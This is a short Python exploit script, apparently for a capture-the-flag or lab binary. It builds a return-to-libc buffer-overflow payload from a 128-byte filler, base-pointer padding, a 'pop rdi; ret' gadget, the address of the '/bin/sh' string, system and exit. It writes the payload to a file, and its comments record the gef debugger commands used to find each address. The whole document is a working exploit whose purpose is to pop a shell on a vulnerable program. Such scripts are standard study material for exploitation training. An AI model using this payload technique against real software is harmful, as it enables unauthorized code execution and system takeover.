#!/usr/bin/env python3

# gef> p system
# 0x7ffff7e1f860
system_call = b"\x00\x00\x7f\xff\xf7\xe1\xf8\x60"[::-1]
# make sure the length fits the architecture!
# null is no issue here because scanf() does not stop reading there.

# gef> p exit
# 0x7ffff7e15100
exit_call = b"\x00\x00\x7f\xff\xf7\xe1\x51\x00"[::-1]

# gef> grep '/bin/sh'
bin_sh_string = b"\x00\x00\x7F\xFF\xF7\xF6\xE8\x82"[::-1]

buffer = 128 * b"a"  # 0x61
backup_base_pointer = 8 * b"b"

# gef> ropper --search 'pop rdi; red;'
rop_pop_rdi_ret = b"\x00\x00\x00\x00\x00\x40\x12\x03"[::-1]

payload = (
    buffer
    + backup_base_pointer  # for padding.
    + rop_pop_rdi_ret
    + bin_sh_string
    + system_call
    + exit_call
)

f = open("payload", "wb")
f.write(payload)
